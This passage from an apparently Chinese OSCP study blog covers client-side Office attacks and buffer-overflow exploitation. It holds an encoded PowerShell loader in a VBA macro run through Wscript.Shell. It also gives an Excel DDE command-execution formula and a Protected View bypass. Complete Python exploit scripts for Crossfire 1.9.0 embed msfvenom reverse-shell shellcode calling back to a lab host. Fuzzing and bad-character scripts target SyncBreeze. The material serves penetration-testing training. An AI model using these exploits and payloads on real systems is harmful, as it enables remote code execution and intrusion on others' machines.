   Str = Str + <span class="hljs-string">&quot;TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A&quot;</span><br>    Str = Str + <span class="hljs-string">&quot;ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY&quot;</span><br>    Str = Str + <span class="hljs-string">&quot;gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB&quot;</span><br>    ...<br>    Str = Str + <span class="hljs-string">&quot;AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac&quot;</span><br>    Str = Str + <span class="hljs-string">&quot;AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB&quot;</span><br>    Str = Str + <span class="hljs-string">&quot;lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA&quot;</span><br>    Str = Str + <span class="hljs-string">&quot;FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA&quot;</span><br>    Str = Str + <span class="hljs-string">&quot;AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK&quot;</span><br>    Str = Str + <span class="hljs-string">&quot;QA=&quot;</span><br>    CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>).Run Str<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="嵌入对象"><a href="#嵌入对象" class="headerlink" title="嵌入对象"></a>嵌入对象</h2><h3 id="对象链接与嵌入"><a href="#对象链接与嵌入" class="headerlink" title="对象链接与嵌入"></a>对象链接与嵌入</h3><ul><li>利用动态数据交换(Dynamic Data Exchange - DDE)从Office文档中执行任意程序<ul><li>2017年官方已经修复</li></ul></li><li>利用Object Linking and Embedding(OLE) 嵌入文档对象<ul><li>嵌入批处理文件(虽然古老, 但功能全支持)</li><li>launch.bat &#x3D;&gt; START cmd.exe</li><li>插入 &#x3D;&gt; 对象 &#x3D;&gt; 由文件创建 &#x3D;&gt; 显示为图标 &#x3D;&gt; 更改图标 &#x3D;&gt; 选择excel图标 &#x3D;&gt; 题注(Readme.xls)<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816221453.png"><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816221506.png"></li></ul></li></ul><h3 id="安全阅读-Protected-View"><a href="#安全阅读-Protected-View" class="headerlink" title="安全阅读(Protected View)"></a>安全阅读(Protected View)</h3><ul><li>之前的方法在本地运行office文档时相对比较有效, 但通过网络(邮件、链接)访问文件时, 必须绕过其他保护层(Protected View) – 禁止编辑、修改、执行宏、执行嵌入对象</li><li>比较直接的绕过方法是使用其他支持宏, 但不支持安全阅读的Office组件, 例如Publisher, 具体方法与之前想用<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816212323.png"></li></ul><h3 id="excel执行命令"><a href="#excel执行命令" class="headerlink" title="excel执行命令"></a>excel执行命令</h3><ul><li><code>=cmd| &#39;/c cmd.exe /c calc.exe&#39;!&#39;A1&#39;</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>客户端攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux缓冲区溢出</title>
    <link href="/2022/08/15/Linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/08/15/Linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux缓冲区溢出"><a href="#Linux缓冲区溢出" class="headerlink" title="Linux缓冲区溢出"></a>Linux缓冲区溢出</h1><ol><li>EIP</li><li>BadChar</li><li>JMP ESP(mona)</li><li>EXP</li></ol><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><ul><li>Crossfire 是一个基于Linux系统的在线多人角色扮演游戏</li><li>Crossfire 1.9.0存在基于网络的缓冲区溢出漏洞<ul><li>漏洞指令: setup sound</li><li>溢出长度: 4000字节</li></ul></li><li>调试工具 EDB<ul><li>灵感崽子Ollydbg</li></ul></li><li>32位程序<ul><li>使用32位Kali Linux动态调试</li></ul></li></ul><h2 id="DEP-ALSR-amp-Canaries"><a href="#DEP-ALSR-amp-Canaries" class="headerlink" title="DEP, ALSR &amp; Canaries"></a>DEP, ALSR &amp; Canaries</h2><h3 id="DEP-ALSR-Canaries"><a href="#DEP-ALSR-Canaries" class="headerlink" title="DEP, ALSR, Canaries"></a>DEP, ALSR, Canaries</h3><ul><li>最新版Linux内核以及编译器都采用了不同的内存保护技术</li><li>DEP(数据执行保护)</li><li>ASLR(地址空间布局随机化)</li><li>Stack Canaries(堆栈溢出保护技术)</li></ul><h2 id="测定EIP溢出偏移量"><a href="#测定EIP溢出偏移量" class="headerlink" title="测定EIP溢出偏移量"></a>测定EIP溢出偏移量</h2><h3 id="程序崩溃复现"><a href="#程序崩溃复现" class="headerlink" title="程序崩溃复现"></a>程序崩溃复现</h3><ul><li>执行攻击脚本</li><li>生成字符序列<ul><li><code>msf-pattern_create -l 4379</code></li></ul></li><li>替换crash变量内容, 再次执行exp, 测定EIP溢出位置(偏移)<ul><li><code>msf-pattern_offset -q 46367046</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><br>host = <span class="hljs-string">&quot;10.11.0.128&quot;</span><br><br>crash = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">4379</span><br><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + crash + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, <span class="hljs-number">13327</span>))<br><span class="hljs-built_in">print</span> s.recv(<span class="hljs-number">1024</span>)<br><br>s.send(buffer)<br>s.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815164543.png"></li></ul></li></ul><h2 id="ShellCode位置"><a href="#ShellCode位置" class="headerlink" title="ShellCode位置"></a>ShellCode位置</h2><h3 id="返回地址"><a href="#返回地址" class="headerlink" title="返回地址"></a>返回地址</h3><ul><li>找到崩溃时指向缓冲区的寄存器, 搜索JMP、CALL此寄存器的指令, 实现修改程序流</li><li>ESP寄存器只有7个字符长度可用, 多一个字节都会导致EIP修改失败</li><li>发现EAX寄存器指向堆栈顶部<ul><li>跳过”setup sound”则可以到达自定义注入区域AAAAA……</li></ul></li><li>向ESP指向的7个字节堆栈注入add eax,12、JMP EAX<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815165124.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><br>host = <span class="hljs-string">&quot;10.11.0.128&quot;</span><br>padding = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">4368</span><br><br>eip = <span class="hljs-string">&quot;\x42\x42\x42\x42&quot;</span><br><br>first_stage = <span class="hljs-string">&quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;</span><br><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + padding + eip + first_stage + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, <span class="hljs-number">13327</span>)) <span class="hljs-built_in">print</span> s.recv(<span class="hljs-number">1024</span>)<br>s.send(buffer) s.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="检查坏字符"><a href="#检查坏字符" class="headerlink" title="检查坏字符"></a>检查坏字符</h3><ul><li>与 Windows 缓冲区溢出模块中的方法相同</li><li>仅找到为 \x00 和 \x20</li></ul><h2 id="返回地址-1"><a href="#返回地址-1" class="headerlink" title="返回地址"></a>返回地址</h2><h3 id="找到返回地址"><a href="#找到返回地址" class="headerlink" title="找到返回地址"></a>找到返回地址</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815165544.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><br>host = <span class="hljs-string">&quot;10.11.0.128&quot;</span><br><br>padding = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">4368</span><br>eip = <span class="hljs-string">&quot;\x96\x45\x13\x08&quot;</span><br>first_stage = <span class="hljs-string">&quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;</span><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + padding + eip + first_stage + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, <span class="hljs-number">13327</span>)) <span class="hljs-built_in">print</span> s.recv(<span class="hljs-number">1024</span>)<br>s.send(buffer) s.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></td></tr></table></figure><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><ul><li>msf生成payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs zsh">kali@kali:~$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b &quot;\x0 0\x20&quot; -f py -v shellcode<br>[-] No platform was selected, choosing<br>Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload<br>Found 11 compatible encoders<br>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 95 (iteration=0) x86/shikata_ga_nai chosen with final size 95<br>Payload size: 95 bytes<br>Final size of py file: 470 bytes<br>shellcode = &quot;&quot;<br>shellcode += &quot;\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29&quot;<br>shellcode += &quot;\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41&quot;<br>shellcode += &quot;\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71&quot;<br>shellcode += &quot;\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04&quot;<br>shellcode += &quot;\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d&quot;<br>shellcode += &quot;\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72&quot;<br>shellcode += &quot;\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34&quot;<br>shellcode += &quot;\x7f\x6d\x02\x36&quot;<br></code></pre></td></tr></table></figure></li><li>最终poc<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><br>host = <span class="hljs-string">&quot;10.11.0.128&quot;</span><br>nop_sled = <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">8</span> <span class="hljs-comment"># NOP sled</span><br><br>shellcode = <span class="hljs-string">&quot;&quot;</span><br>shellcode += <span class="hljs-string">&quot;\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29&quot;</span><br>shellcode += <span class="hljs-string">&quot;\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41&quot;</span><br>shellcode += <span class="hljs-string">&quot;\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71&quot;</span><br>shellcode += <span class="hljs-string">&quot;\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04&quot;</span><br>shellcode += <span class="hljs-string">&quot;\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d&quot;</span><br>shellcode += <span class="hljs-string">&quot;\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72&quot;</span><br>shellcode += <span class="hljs-string">&quot;\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34&quot;</span><br>shellcode += <span class="hljs-string">&quot;\x7f\x6d\x02\x36&quot;</span><br><br>padding = <span class="hljs-string">&quot;\x41&quot;</span> * (<span class="hljs-number">4368</span> - <span class="hljs-built_in">len</span>(nop_sled) - <span class="hljs-built_in">len</span>(shellcode))<br><br>eip = <span class="hljs-string">&quot;\x96\x45\x13\x08&quot;</span> <span class="hljs-comment"># 0x08134596</span><br>first_stage = <span class="hljs-string">&quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;</span><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + padding + eip + first_stage + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, <span class="hljs-number">13327</span>)) <span class="hljs-built_in">print</span> s.recv(<span class="hljs-number">1024</span>)<br>s.send(buffer) s.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这次buffer overflow的程序有几个注意点</strong></p><ol><li>这个程序超过4379个字符注入时会直接崩溃</li><li>ESP寄存器只有7个字符长度可用, 所以得考虑跳到别的寄存器来注入payload</li><li>EIP 跳到 ESP的地址 然后 ESP地址写入跳转到EAX的指令 在EAX注入payload</li><li>Try Harder!</li></ol>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>OSCP</tag>
      
      <tag>漏洞挖掘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows缓冲区溢出</title>
    <link href="/2022/08/13/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/08/13/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><ol><li>在不接触源码的情况下发现漏洞</li><li>发现所有的数据提交入口</li><li>检测提交数据对堆栈内存的影响</li><li>篡改内存实现远程代码执行</li></ol><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="漏洞挖掘方法"><a href="#漏洞挖掘方法" class="headerlink" title="漏洞挖掘方法"></a>漏洞挖掘方法</h3><ul><li>源码审计分析</li><li>逆向分析</li><li>模糊测试<ul><li>提交随机、半随机数据, 观察程序如何处理(崩溃)</li></ul></li><li>协议指令</li><li>fuzzer生成畸形的输入数据</li><li>Debugger跟踪分析堆栈、寄存器、程序流的变化记</li></ul><h3 id="HTTP协议模糊测试"><a href="#HTTP协议模糊测试" class="headerlink" title="HTTP协议模糊测试"></a>HTTP协议模糊测试</h3><ul><li>SyncBreeze version 10.0.28 无需身份认证缓冲区溢出漏洞(2017)</li><li>开启服务Options &#x3D;&gt; Server &#x3D;&gt; Enable Web Server On Port:80</li><li>Fuzz所有数据提交入口(表单域)</li><li>Wireshark抓取流量, 然后登录表单, 还原TCP流, 获取认证请求<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.11.0.22<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.11.0.22/login<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br>username=AAAA&amp;password=BBBB<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python import socket</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nSending evil buffer...&quot;</span><br>    <br>    size = <span class="hljs-number">100</span><br>    <br>    inputBuffer = <span class="hljs-string">&quot;A&quot;</span> * size<br>    <br>    content = <span class="hljs-string">&quot;username=&quot;</span> + inputBuffer + <span class="hljs-string">&quot;&amp;password=A&quot;</span><br>    buffer = <span class="hljs-string">&quot;POST /login HTTP/1.1\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Host: 10.11.0.22\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Connection: close\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Content-Length: &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content))+<span class="hljs-string">&quot;\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;\r\n&quot;</span><br>    buffer += content<br><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <br>    s.connect((<span class="hljs-string">&quot;10.11.0.22&quot;</span>, <span class="hljs-number">80</span>))<br>    s.send(buffer)<br>    <br>    s.close()<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nDone!&quot;</span><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Could not connect!&quot;</span><br></code></pre></td></tr></table></figure><h2 id="溢出攻击"><a href="#溢出攻击" class="headerlink" title="溢出攻击"></a>溢出攻击</h2><h3 id="控制EIP寄存器"><a href="#控制EIP寄存器" class="headerlink" title="控制EIP寄存器"></a>控制EIP寄存器</h3><ul><li>SyncBreeze编译不支持DEP、ASLR、CFG<ul><li>DEP: 是一组对内存执行额外检查的硬件和软件技术, 帮助防止从数据页执行代码</li><li>ASLR: 每次系统启动时, 将加载的应用程序和dll的基址随机化</li><li>CFG: 执行间接代码分支的验证, 防止函数指针的重写</li></ul></li><li>使用msf-pattern_create生成<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813204004.png"></li></ul><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><ul><li>重启程序、运行PoC, EIP寄存器中发现4个字节内容42306132 &#x3D;&gt; B0aB</li><li>定位以上4字节内容在800字节序列中的偏移位置<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815093802.png"></li><li>修改代码在780偏移后添加0x42424242 &#x3D;&gt; BBBB, 验证其精准写入EIP寄存器</li><li>为Shellcode定位存放空间<ul><li>观察上一步PoC执行结果, 发现43434343 &#x3D;&gt; CCCC…, 因此计划将shellcode写入ESP</li><li>标准反弹shell需要约350-400字节存储空间, 因此注入更多数据, 测定可写空间够shellcode用</li><li>可写空间为(0x030E771C - 0x030E745C)</li><li>重复测试, 发现ESP指向的内存地址每次都发生变化</li></ul></li></ul><h3 id="测定坏字符"><a href="#测定坏字符" class="headerlink" title="测定坏字符"></a>测定坏字符</h3><ul><li>基于不同的程序、协议、漏洞类型, 某些坏字符不能用于缓冲区、返回地址、shellcode中</li><li>向缓冲区注入0x00 - 0xFF编码的所有字符, 并查看程序如何处理每个字符</li><li>执行Poc后, 右击ESP选择Follow in Dump显示内存中的输入字符<ul><li>发现0x0A字符消失 -&gt; 坏字符</li><li>以此类推修改badchars, 最终发现0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D是坏字符<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br>badchars = (<br><span class="hljs-string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span><br><span class="hljs-string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span><br><span class="hljs-string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span><br><span class="hljs-string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="hljs-string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span><br><span class="hljs-string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span><br><span class="hljs-string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span><br><span class="hljs-string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span><br><span class="hljs-string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span><br><span class="hljs-string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span><br><span class="hljs-string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span><br><span class="hljs-string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span><br><span class="hljs-string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span><br><span class="hljs-string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span><br><span class="hljs-string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span><br><span class="hljs-string">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nSending evil buffer...&quot;</span><br>    filler = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">780</span><br>    eip = <span class="hljs-string">&quot;B&quot;</span> * <span class="hljs-number">4</span><br>    offset = <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">4</span><br><br>    inputBuffer = filler + eip + offset + badchars<br>    content = <span class="hljs-string">&quot;username=&quot;</span> + inputBuffer + <span class="hljs-string">&quot;&amp;password=A&quot;</span><br>...<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815095625.png"></li></ul></li></ul><h3 id="重定向执行流"><a href="#重定向执行流" class="headerlink" title="重定向执行流"></a>重定向执行流</h3><ul><li>LIBSPP.DLL满足要求。找到此模块中JMP ESP指令地址</li><li>mona.py可以搜索汇编指令二进制和十六进制的编码心事(opcode)</li><li>将JMP ESP执行转换为opcode<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815104836.png"></li><li>在LIBSPP.DLL的所有区块搜索JMP ESP(0xFFE4)<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105404.png"><br><strong>找到所有安全机制为False的</strong></li></ul><p><img 